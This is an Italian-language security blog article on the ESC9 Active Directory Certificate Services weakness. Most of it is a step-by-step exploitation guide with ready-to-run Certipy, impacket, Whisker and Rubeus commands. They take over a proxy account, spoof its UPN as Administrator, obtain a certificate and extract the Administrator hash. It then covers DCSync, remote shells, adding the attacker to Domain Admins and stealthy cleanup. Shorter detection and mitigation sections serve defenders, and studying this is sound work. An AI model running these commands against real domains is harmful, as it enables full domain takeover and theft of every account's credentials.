---
title: 'ESC9 ADCS: Privilege Escalation tramite Template senza SID Security Extension'
slug: esc9-adcs
description: ESC9 sfrutta template AD CS senza SID Security Extension per impersonare utenti privilegiati. Guida pratica con Certipy e UPN manipulation.
image: /9.webp
draft: false
date: 2026-03-08T00:00:00.000Z
lastmod: 2026-06-26T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - adcs
  - esc9
  - certipy
---

# ESC9 ADCS: PrivEsc a Domain Admin via Weak Certificate Mapping | Certipy Exploitation + Event 39/41 Detection + Mitigazione (KB5014754) 2026

**ESC9** è una misconfiguration critica in Active Directory Certificate Services (ADCS) che consente di escalare privilegi impersonando utenti privilegiati come Domain Admin. A differenza di altre ESC (ESC1, ESC2, ecc.), ESC9 non si basa su problemi di enrollment diretti, ma su **certificate mapping debole** — il processo attraverso il quale Active Directory associa un certificato a un account AD.

Quando un certificate template manca della **security extension** (`szOID_NTDS_CA_SECURITY_EXT`, OID 1.3.6.1.4.1.311.25.2) e il Domain Controller non applica strong binding enforcement con valore 2, un attaccante può modificare l'UPN (User Principal Name) di un account controllato per corrispondere a quello di un admin, richiedere un certificato, e autenticarsi come admin tramite PKINIT.

Questa vulnerabilità è nata da **KB5014754** (patch Microsoft maggio 2022) che introdusse la security extension per proteggere certificate mapping, ma richiese backward compatibility disabilitando selettivamente la protezione su specifici template.

***

## Come Funziona Certificate Mapping

### Implicit vs. Explicit Mapping

Active Directory supporta due modalità di certificate mapping:

**Implicit Mapping** associa il certificato a un account AD basandosi su campi nel Subject Alternative Name (SAN):

* User Principal Name (UPN)
* DNS name (dNSHostName per computer)
* RFC822 (email)

Questo metodo è vulnerabile perché attaccanti possono modificare questi campi su account controllati.

**Explicit Mapping** richiede una connessione manuale tramite l'attributo `altSecurityIdentities`. Risulta più sicuro in teoria, ma se l'attaccante ha write permissions su un account, può aggiungere mapping arbitrari.

### Strong vs. Weak Mapping

**Strong Mapping** verifica che il certificato contenga `objectSid` — identificatore univoco legato all'account AD. Impostato tramite `szOID_NTDS_CA_SECURITY_EXT`.

**Weak Mapping** si affida solo a UPN/DNS nel SAN, senza validare l'`objectSid`. ESC9 sfrutta questa modalità.

### StrongCertificateBindingEnforcement

Microsoft ha introdotto questa chiave di registro per forzare strong binding:

```
HKLM\System\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement
```

* **Mode 0 (Disabled)**: Nessun controllo forte, accetta weak mapping sempre
* **Mode 1 (Compatibility)**: Il DC cerca `objectSid`, ma consente weak mapping se assente (backward compat)
* **Mode 2 (Full Enforcement)**: Certificati senza `objectSid` sono rifiutati — **ESC9 è impossibile**

**ESC9 sfrutta Mode 0 o 1**.

### CertificateMappingMethods (Schannel)

Chiave di registro separata per TLS/SSL authentication:

```
HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods
```

Bitmask (default 0x18):

* `0x01` = Explicit mapping (altSecurityIdentities)
* `0x02` = Principal name mapping (UPN in SAN)
* `0x04` = RFC822 mapping (email)
* `0x08` = DNS name mapping
* `0x10` = Issuer-subject mapping
* `0x1F` = All methods

**ESC10 Case 2** sfrutta questi bits se `0x02` o `0x04` abilitati + UPN spoofing.

***

## Attributi Template Critici

### msPKI-Enrollment-Flag

Controlla come CA emette certificati. Flag rilevante per ESC9:

* **CT\_FLAG\_NO\_SECURITY\_EXTENSION (0x80000, 524288 decimale)**: Disabilita inclusione di `objectSid` nel certificato

Verificare in ADSI Edit:

```
CN=TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
→ msPKI-Enrollment-Flag = 524288 (o OR con altri flag)
```

### msPKI-Certificate-Name-Flag

Controlla come il soggetto del certificato è costruito. Valori vulnerabili:

* **0x0 (0)**: Build from AD only — Safe
* **0x1 (1)**: Supply in request — Vulnerable (utente fornisce subject)
* **0x3 (3)**: Build from AD + Supply in request — Vulnerable
* **0x10 (16)**: Enforce UPN in SAN — Required per ESC9 se combinato con supply

**Se msPKI-Certificate-Name-Flag = 1 o 3 E SAN include UPN → ESC9 exploitable**

### Extended Key Usage (EKU)

Definisce quali operazioni il certificato può compiere. Per ESC9:

* **Client Authentication** — Consente autenticazione come user

***

## Requisiti per Sfruttare ESC9

Un certificate template è vulnerabile a ESC9 quando soddisfa **TUTTI** questi criteri:

### 1. CT\_FLAG\_NO\_SECURITY\_EXTENSION Abilitato

L'attributo `msPKI-Enrollment-Flag` deve includere il flag `0x80000` (524288) che disabilita l'inclusione dell'`objectSid`.

Verificare:

```bash
certipy-ad find -u 'user@domain.local' -p 'Pass' -dc-ip 10.0.0.100 -vulnerable
```

Cercare: `Enrollment Flag: NoSecurityExtension`

### 2. EKU Client Authentication

Template ha **Extended Key Usage** = **Client Authentication**

### 3. Nessuna Manager Approval

```
msPKI-RA-Application-Policies = (empty or no manager approval flags)
```

### 4. Enrollment Permissions Permissive

Utenti low-privileged come `Domain Users` o `Authenticated Users` possono enrollare.

### 5. Write Permissions su Account Target

L'attaccante ha almeno `GenericWrite`, `WriteDACL`, o `GenericAll` su un account AD. Tramite questi permessi modifica l'UPN.

### 6. StrongCertificateBindingEnforcement != 2

DC ha Mode 0 o 1 (non Mode 2 full enforcement).

***

## Enumerazione di Template Vulnerabili

### Con Certipy

```bash
certipy-ad find -u 'user@domain.local' -p 'Password123' \
  -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
```

Cercare output:

```
[!] Vulnerabilities
  ESC9 : Template has no security extension

msPKI-Enrollment-Flag : NoSecurityExtension
msPKI-Certificate-Name-Flag : 1 or 3 (supply in request)
Extended Key Usage (EKU) : Client Authentication
Enrollment Rights : Domain Users
```

### Con BloodHound

Identificare:

* Template con `NoSecurityExtension` (flag 0x80000)
* Account su cui si ha `GenericWrite`, `WriteDACL`, `GenericAll`
* BloodHound edges **ADCSESC9a** / **ADCSESC9b** (4.2+) — collegano account exploitable a domain se ESC9 + weak DC setting

### Con LDAP Query

```bash
ldapsearch -H ldap://dc01.domain.local -D 'CN=admin,CN=Users,DC=domain,DC=local' \
  -w Password123 -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' \
  '(msPKI-Enrollment-Flag=524288)' displayName msPKI-Enrollment-Flag
```

***

## Exploit ESC9 – Step by Step

### Step 1: Enumerare Template Vulnerabili

```bash
certipy-ad find -u 'attacker@domain.local' -p 'Password123' \
  -dc-ip 192.168.1.100 -vulnerable -enabled
```

Identificare template con flag `NoSecurityExtension` e enrollment rights per `Domain Users`.

### Step 2: Identificare Account Controllabile

Usando BloodHound, trovare un utente su cui si ha `GenericWrite`, `WriteDACL`, o `GenericAll`. Questo account servirà come **proxy** per l'impersonazione.

Esempio: attacker controlla `proxy_user`.

### Step 3: Verificare Permessi

Confermare accesso:

```bash
impacket-dacledit -action read -dc-ip 192.168.1.100 \
  domain.local/attacker:'Password123' \
  -principal attacker -target proxy_user
```

Output atteso: `FullControl` o almeno `GenericWrite`.

Se solo `WriteOwner` o `WriteDACL`, escalare con dacledit:

```bash
impacket-dacledit -action write -rights 'FullControl' \
  -principal attacker -target proxy_user -dc-ip 192.168.1.100 \
  domain.local/attacker:'Password123'
```

### Step 4: Ottenere Credenziali del Proxy Account

**Opzione A: Shadow Credentials**

```bash
certipy-ad shadow auto -u 'attacker@domain.local' \
  -p 'Password123' -account proxy_user -dc-ip 192.168.1.100
```

Output: hash NT e ccache per autenticarsi come `proxy_user`.

**Opzione B: Reset Password** (più rumoroso)

```bash
impacket-net.py -domain-controller 192.168.1.100 \
  -domain domain.local -username attacker \
  -password Password123 user edit -target proxy_user -newpass 'NewPass123!'
```

### Step 5: Modificare UPN del Proxy Account

**CRITICO:** Cambiare l'UPN di `proxy_user` per corrispondere a quello dell'admin:

```bash
certipy-ad account update -u 'attacker@domain.local' \
  -p 'Password123' -user proxy_user \
  -upn 'Administrator@domain.local' -dc-ip 192.168.1.100
```

**Nota importante:** Se il DC è sensibile, usare **bare UPN** senza `@domain` per evitare collision:

```bash
certipy-ad account update -u 'attacker@domain.local' \
  -p 'Password123' -user proxy_user \
  -upn 'Administrator' -dc-ip 192.168.1.100
```

Verificare cambio:

```bash
ldapsearch -H ldap://192.168.1.100 -D 'CN=attacker,CN=Users,DC=domain,DC=local' \
  -w Password123 -b 'DC=domain,DC=local' \
  '(sAMAccountName=proxy_user)' userPrincipalName
```

### Step 6: Richiedere Certificato

```bash
certipy-ad req -u 'proxy_user@domain.local' \
  -hashes ':hash_nt' -ca 'domain-DC-CA' \
  -template 'TemplateName' -dc-ip 192.168.1.100
```

Il certificato sarà emesso con UPN = `Administrator@domain.local` (o `Administrator`) ma senza `objectSid`.

### Step 7: Ripristinare UPN Originale PRIMA di Auth

**ESSENZIALE:** Cambiare UPN indietro prima di autenticarsi, altrimenti DC mapperà cert a `proxy_user`:

```bash
certipy-ad account update -u 'attacker@domain.local' \
  -p 'Password123' -user proxy_user \
  -upn 'proxy_user@domain.local' -dc-ip 192.168.1.100
```

Aspettare \~5-10 secondi per AD replication.

### Step 8: Autenticarsi come Administrator

```bash
certipy-ad auth -pfx administrator.pfx -domain domain.local \
  -dc-ip 192.168.1.100
```

Output: NT hash di Administrator e ccache Kerberos.

### Step 9: Verificare Hash

```bash
nxc ldap 192.168.1.100 -u Administrator \
  -H 'nt_hash_obtained' -d domain.local
```

Output: `[+]` significa hash valido.

***

## Prove di Impatto

Una volta compromesso Domain Admin:

### DCSync

```bash
secretsdump.py -just-dc domain.local/Administrator@192.168.1.100 \
  -hashes ':nt_hash'
```

Estrae tutti i credential hash del dominio.

### Evil-WinRM

```bash
evil-winrm -i 192.168.1.100 -u Administrator -H 'nt_hash'
```

Shell interattiva su Domain Controller.

### LDAP Shell

```bash
certipy-ad auth -pfx administrator.pfx \
  -ldap-shell -dc-ip 192.168.1.100
```

Eseguire operazioni LDAP (modify group memberships, create accounts persistenti, ecc.).

***

## Detection & IOC

### Event ID Critici

| Event | Source        | Significato                                 | Indicazione                                                 |
| ----- | ------------- | ------------------------------------------- | ----------------------------------------------------------- |
| 4886  | CA            | Certificate request received                | Ricerca anomala di template                                 |
| 4887  | CA            | Certificate issued                          | Cert emesso per identità non matchante                      |
| 4738  | DC            | User account changed                        | UPN modified (pre-cert-request)                             |
| 4769  | DC            | Kerberos TGS requested                      | TGT per DA da macchina inaspettata                          |
| 39/41 | DC (Kerberos) | Cert mapping failure / weak mapping warning | Cert senza SID o UPN mismatch — Strong ESC9/ESC10 indicator |
| 4900  | CA            | Template permission changed                 | ACL modification su template                                |

**Event ID 39/41:** KDC genera quando certificato è valido ma non mappa strongly. Include mismatch SID: il SID nel certificato (o mancante) non corrisponde al SID del richiedente. Con StrongCertificateBindingEnforcement = 1, viene loggato e auth fallisce. Se = 2, login direttamente rifiutato (nessun log).

### Query LDAP per Identificare Template Vulnerabili

```bash
ldapsearch -H ldap://dc01.domain.local -D 'CN=admin,CN=Users,DC=domain,DC=local' \
  -w Password123 -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' \
  '(|(msPKI-Enrollment-Flag=524288)(msPKI-Enrollment-Flag=524544))' \
  displayName msPKI-Enrollment-Flag msPKI-Certificate-Name-Flag
```

### Timeline di Attacco Tipico

```
T0:     Shadow credential injection
T0+5min: UPN modification on proxy account
T0+10min: Certificate request from vulnerable template
T0+15min: UPN reverted
T0+20min: PKINIT authentication as target
T0+25min: DCSync or persistence setup
```

### Correlazione Log

Cercare questa sequenza:

1. Event 4886/4887 (cert issued)
2. Event 4738 (UPN change) PRIMA di 4886
3. Event 4738 (UPN reverted) DOPO 4886
4. Event 4768/4769 (TGT/TGS per privileged account) SUBITO DOPO

***

## Comandi Operativi Completi

### Verifica Pre-Attack

Verificare che UPN sia stato cambiato correttamente PRIMA di richiedere il certificato:

```bash
ldapsearch -H ldap://192.168.1.100 -D 'CN=attacker,CN=Users,DC=domain,DC=local' \
  -w Password123 -b 'DC=domain,DC=local' \
  '(sAMAccountName=proxy_user)' userPrincipalName
```

Output atteso: `userPrincipalName: Administrator@domain.local`

### Enumerazione Certificati da Certificato Valido

Dopo aver ottenuto il certificato, parsearlo per verificare UPN/SID:

```bash
certipy-ad cert -pfx administrator.pfx -text -nokey
```

Verificare che SID sia assente o non corrisponda a Administrator reale.

### Estrazione NT Hash (UnPac the Hash)

Certipy estrae automaticamente l'hash, ma per esplicitare:

```bash
certipy-ad auth -pfx administrator.pfx -domain domain.local -dc-ip 192.168.1.100
```

Output: `[*] Got hash for 'Administrator@domain.local': aabbccdd...` (NT hash in plaintext)

Se il comando non estrae hash, usare impacket direttamente:

```bash
python3 -m impacket.krb5ccache -c administrator.ccache
```

### Windows: Certify + Rubeus Chain

**Enumeration:**

```batch
.\Certify.exe find /vulnerable /enabled
```

**Iniezione Shadow Credential (Whisker):**

```batch
.\Whisker.exe add /target:proxy_user /dc:192.168.1.100 /path:C:\temp
```

Output: Comando Rubeus da eseguire.

**Request Certificate:**

```batch
.\Rubeus.exe asktgt /user:proxy_user /certificate:C:\path\to\proxy_user.pfx /password:"password_from_whisker" /domain:domain.local /dc:192.168.1.100 /getcredentials /show
```

**Estrazione Hash:**
L'output di Rubeus include già l'NT hash di proxy\_user. Per target (Administrator), usare certificate authentication prima.

### Reset Password Alternativo (impacket-net)

Se shadow credentials non funzionano o scelta operativa è reset:

```bash
impacket-net.py domain.local/attacker:Password123 -dc-ip 192.168.1.100 \
  user change -username proxy_user -newpass 'TempPassword123!'
```

**Nota:** Più rumoroso (Event 4723), lascia traccia di reset. Shadow credentials preferred.

### PKINIT Esplicito (Test Compatibilità)

Alcuni ambienti richiedono PKINIT esplicito invece di PKINIT automatico di Certipy:

```bash
kinit -C FILE:administrator.pfx Administrator@DOMAIN.LOCAL
```

Se fallisce con `KDC_ERR_C_PRINCIPAL_UNKNOWN`, la mappatura ha fallito. Verificare:

* UPN nel certificato
* StrongCertificateBindingEnforcement setting
* Explicit mapping setup

### Validazione Hash su LDAP

Prima di passare a post-exploitation, validare hash:

```bash
nxc ldap 192.168.1.100 -u Administrator -H 'hash_ottenuto' -d domain.local --continue-on-error
```

Output: `[+] domain.local\Administrator` = hash valido.

### Post-Exploitation: DCSync Completo

```bash
secretsdump.py -just-dc -just-dc-user Administrator \
  domain.local/Administrator@192.168.1.100 -hashes ':nt_hash'
```

Output: Tutti gli hash del dominio in NTDS.dit.

### Post-Exploitation: Evil-WinRM con Verifica

```bash
evil-winrm -i 192.168.1.100 -u Administrator -H 'hash_ottenuto' \
  -s /usr/share/evil-winrm/scripts
```

Dentro la shell:

```powershell
whoami /all
Get-NetComputer -ComputerName DC01 -ComputerIdentity
```

Verificare privilegi Domain Admin.

### LDAP Shell per Operazioni Silenziose

```bash
certipy-ad auth -pfx administrator.pfx -domain domain.local \
  -ldap-shell -dc-ip 192.168.1.100
```

Shell interattiva con permessi admin. Esempi:

```
> add_group_member "Domain Admins" "attacker"
> modify_user_attribute "Administrator" "description" "pwned"
> list_domain_admins
```

### Cleanup Stealth

Ripristinare tracce su account proxy:

```bash
# Verificare UPN è stato ripristinato
ldapsearch -H ldap://192.168.1.100 -D 'CN=attacker,CN=Users,DC=domain,DC=local' \
  -w Password123 -b 'DC=domain,DC=local' \
  '(sAMAccountName=proxy_user)' userPrincipalName

# Output atteso: userPrincipalName: proxy_user@domain.local
```

Se shadow credentials usate, pulire con:

```bash
certipy-ad shadow auto -u attacker@domain.local -p Password123 \
  -account proxy_user -dc-ip 192.168.1.100 -remove
```

***

## Errori Comuni & Troubleshooting

### CERTSRV\_E\_SUBJECT\_EMAIL\_REQUIRED

**Causa:** Template forza email in subject/SAN, ma account proxy non ha email valida o configurata.

**Fix:**

```bash
# Aggiungere email all'account proxy
impacket-net.py domain.local/attacker:Password123 -dc-ip 192.168.1.100 \
  user edit -username proxy_user -email "proxy@domain.local"

# Riprovare cert request
certipy-ad req -u 'proxy_user@domain.local' -hashes ':hash_nt' \
  -ca 'domain-DC-CA' -template 'TemplateName' -dc-ip 192.168.1.100
```

***

### KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN

**Causa:** UPN nel certificato non mappa correttamente. Spesso perché UPN non è stato ripristinato PRIMA di autenticazione.

**Fix:**

```bash
# Verificare che UPN sia stato ripristinato
ldapsearch -H ldap://192.168.1.100 -D 'CN=attacker,CN=Users,DC=domain,DC=local' \
  -w Password123 -b 'DC=domain,DC=local' \
  '(sAMAccountName=proxy_user)' userPrincipalName

# Se ancora "Administrator", ripristinare ora
certipy-ad account update -u 'attacker@domain.local' -p 'Password123' \
  -user proxy_user -upn 'proxy_user@domain.local' -dc-ip 192.168.1.100

# Aspettare replication (10-15 sec) e riprovare auth
sleep 15
certipy-ad auth -pfx administrator.pfx -domain domain.local -dc-ip 192.168.1.100
```

***

### A\_ATT\_MATCH\_ERROR / Certificate Validation Failed

**Causa:** StrongCertificateBindingEnforcement = 2 (Full Enforcement). DC richiede objectSid nel cert, ma template ha CT\_FLAG\_NO\_SECURITY\_EXTENSION.

**Fix - IMPOSSIBILE sfruttare ESC9 in questo ambiente:**

Verificare registry DC:

```batch
reg query "HKLM\System\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
```

Se output = 2: ESC9 è completamente bloccato. Cercare ESC1, ESC6, ESC8 alternativi.

Se output = 0 o 1: Verificare che template abbia veramente CT\_FLAG\_NO\_SECURITY\_EXTENSION:

```bash
certipy-ad find -u 'attacker@domain.local' -p 'Password123' \
  -dc-ip 192.168.1.100 -vulnerable -enabled
```

***

### KDC\_ERR\_PADATA\_TYPE\_NOSUPP

**Causa:** DC non supporta PKINIT per autenticazione con certificato (raro, default = abilitato).

**Fix:**

```bash
# Verificare che PKINIT sia abilitato su DC
reg query "HKLM\System\CurrentControlSet\Services\Kdc" /v PreComputedAuthenticationTypes

# Se fallisce, usare Kerberos over TLS (Schannel) instead:
# Verificare CertificateMappingMethods è configurato
reg query "HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel" /v CertificateMappingMethods

# Output atteso: 0x18 (default) o contiene 0x02 (UPN mapping)
```

***

### Event 39 Generato ma Auth Succeeded (Comportamento Atteso)

**Causa:** StrongCertificateBindingEnforcement = 1 (Compatibility Mode). DC loga weak mapping ma consente auth ugualmente.

**Nota:** NON è un errore — è il comportamento esatto che ESC9 sfrutta.

**Azione:** Monitor Event 39 per rilevare tentativi in real-time. Event 39 = **IOC primario** dell'attacco.

***

### UPN Spoof Non Funziona (Cert Mappato a proxy\_user Invece di Administrator)

**Causa:** Replication ritardo o DC cache non aggiornata.

**Fix:**

```bash
# Verificare UPN corrente
ldapsearch -H ldap://192.168.1.100 -D 'CN=attacker,CN=Users,DC=domain,DC=local' \
  -w Password123 -b 'DC=domain,DC=local' \
  '(sAMAccountName=proxy_user)' userPrincipalName

# Attendere 15-30 sec dopo UPN change prima di cert request
# Se problema persiste, usare bare UPN (NO @domain):
certipy-ad account update -u 'attacker@domain.local' -p 'Password123' \
  -user proxy_user -upn 'Administrator' -dc-ip 192.168.1.100

# Poi fare cert request:
certipy-ad req -u 'proxy_user@domain.local' -hashes ':hash_nt' \
  -ca 'domain-DC-CA' -template 'TemplateName' -dc-ip 192.168.1.100
```

***

### Shadow Credentials Injection Fallisce (Account Locked / Permission Denied)

**Causa:** Permessi insufficienti su account target o account è protetto.

**Fix:**

```bash
# Verificare permessi reali
impacket-dacledit -action read -dc-ip 192.168.1.100 \
  domain.local/attacker:'Password123' \
  -principal attacker -target proxy_user

# Se solo WriteOwner/WriteDACL, escalare prima:
impacket-dacledit -action write -rights 'FullControl' \
  -principal attacker -target proxy_user -dc-ip 192.168.1.100 \
  domain.local/attacker:'Password123'

# Poi ritentare shadow credentials:
certipy-ad shadow auto -u 'attacker@domain.local' \
  -p 'Password123' -account proxy_user -dc-ip 192.168.1.100
```

***

### Template Non Appare in Certipy Output (Even with -vulnerable Flag)

**Causa:** Template non è published su CA o è disabled.

**Fix:**

```bash
# Cercare tutti i template (non solo vulnerable):
certipy-ad find -u 'attacker@domain.local' -p 'Password123' \
  -dc-ip 192.168.1.100 -stdout

# Verificare se template è listed e con quale stato
# Se manca, verificare su CA direttamente:
# → Apri certsrv.msc → Certificate Templates → Gestisci
# → Cerca template → Right-click → Pubblica su DC

# Oppure da PowerShell:
Get-ADObject -Filter {objectClass -eq 'pKICertificateTemplate'} \
  -Properties displayName,msPKI-Enrollment-Flag | \
  Where-Object {$_.displayName -like "*TemplateName*"}
```

***

### Certificate Request Timeout / Connection Refused

**Causa:** CA non è raggiungibile o IP DC errato.

**Fix:**

```bash
# Verificare reachability CA
nxc ldap 192.168.1.100 -u attacker -p Password123 -d domain.local

# Ottenere corretto FQDN CA
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local

# Riprovare con FQDN corretto:
certipy-ad req -u 'proxy_user@domain.local' -hashes ':hash_nt' \
  -ca 'domain-DC-CA' -template 'TemplateName' \
  -target dc01.domain.local -dc-ip 192.168.1.100
```

***

## Mitigazione

### 1. Abilitare Full Enforcement (PRIMARIO)

Su **OGNI** Domain Controller, impostare Mode 2:

```batch
reg add "HKLM\System\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement /t REG_DWORD /d 2 /f
```

Riavviare servizio KDC:

```batch
net stop kdc && timeout /t 5 && net start kdc
```

**Nota:** Questo può rompere autenticazione con certificati vecchi (pre-maggio 2022). Testare in staging first.

### 2. Rimuovere CT\_FLAG\_NO\_SECURITY\_EXTENSION

Da tutti i template non necessari:

```powershell
Get-ADObject -Filter {objectClass -eq 'pKICertificateTemplate'} -Properties msPKI-Enrollment-Flag | 
  Where-Object {$_.'msPKI-Enrollment-Flag' -band 0x80000} | 
  ForEach-Object {
    Set-ADObject $_ -Replace @{'msPKI-Enrollment-Flag'=($_.'msPKI-Enrollment-Flag' -bxor 0x80000)}
  }
```

Verificare:

```powershell
Get-ADObject -Filter {objectClass -eq 'pKICertificateTemplate'} -Properties msPKI-Enrollment-Flag | 
  Where-Object {$_.'msPKI-Enrollment-Flag' -band 0x80000}
```

(Non deve restituire nulla)

### 3. Limitare Enrollment Permissions

Assegnare enrollment a specifici security groups admin-only, non a `Domain Users`:

```powershell
# Rimuovere Domain Users da template
$template = Get-ADObject -Identity "CN=UserTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"
$acl = Get-Acl -Path "AD:\$($template.DistinguishedName)"
# (Rimuovere SID di Domain Users)
```

### 4. Abilitare Audit Certificate Issuance

Su CA:

```batch
certutil -setreg CA\AuditFilter 127
net stop certsvc && net start certsvc
```

Registra Event 4886/4887.

### 5. Monitor Write Permissions

Script PowerShell periodico per rilevare nuovi permessi `GenericWrite`/`GenericAll` su account:

```powershell
Get-ADUser -Filter * | ForEach-Object {
  $acl = Get-Acl "AD:\$($_.DistinguishedName)"
  $acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll" -and $_.AccessControlType -eq "Allow"}
}
```

### 6. Implementare Approval Policy

Richiedere manager approval su template sensibili (CA MMC → Template → Properties → Issuance Requirements).

***

## Differenza ESC9 vs ESC10

| Aspetto                  | ESC9                                                              | ESC10                                                                               |
| ------------------------ | ----------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| **Requisito Template**   | CT\_FLAG\_NO\_SECURITY\_EXTENSION (msPKI-Enrollment-Flag 0x80000) | Nessun template specifico richiesto                                                 |
| **Requisito DC**         | StrongCertificateBindingEnforcement = 0 o 1                       | StrongCertificateBindingEnforcement = 0 o CertificateMappingMethods abilita UPN/DNS |
| **Attributo Modificato** | UPN del proxy account                                             | UPN (ESC10 Case A) o dNSHostName (ESC10 Case B)                                     |
| **Impatto**              | Kerberos authentication                                           | Kerberos + Schannel (TLS)                                                           |
| **Scope**                | Solo template vulnerabili                                         | Any client-auth template                                                            |

***

## Timeline Rollout Microsoft & Enforcement Phases

Dopo KB5014754 (maggio 2022), Microsoft ha implementato rollout in tre fasi:

1. **Compatibility Mode (maggio 2022)**: DC accetta cert senza SID se UPN mappa. Log Event 39 ma allow auth.
2. **Audit Phase (fino febbraio 2025)**: DC continua allow, abilita detection massiccio di mismatch.
3. **Enforcement Phase (febbraio 2025+)**: DC rifiuta cert senza SID, ESC9 diventa impossibile.

Per organizzazioni che devono mantenere backward compat con vecchi cert (pre-maggio 2022), fallback a compatibility mode rimane possibile tramite registry, ma espone a ESC9/ESC10.

***

## Riferimenti

* [https://ring0shady.github.io/posts/esc9/](https://ring0shady.github.io/posts/esc9/) — ESC9 & ESC10 deep dive
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy) — Certipy (tool primary)
* /silver-ticket (link interno hackita.it)
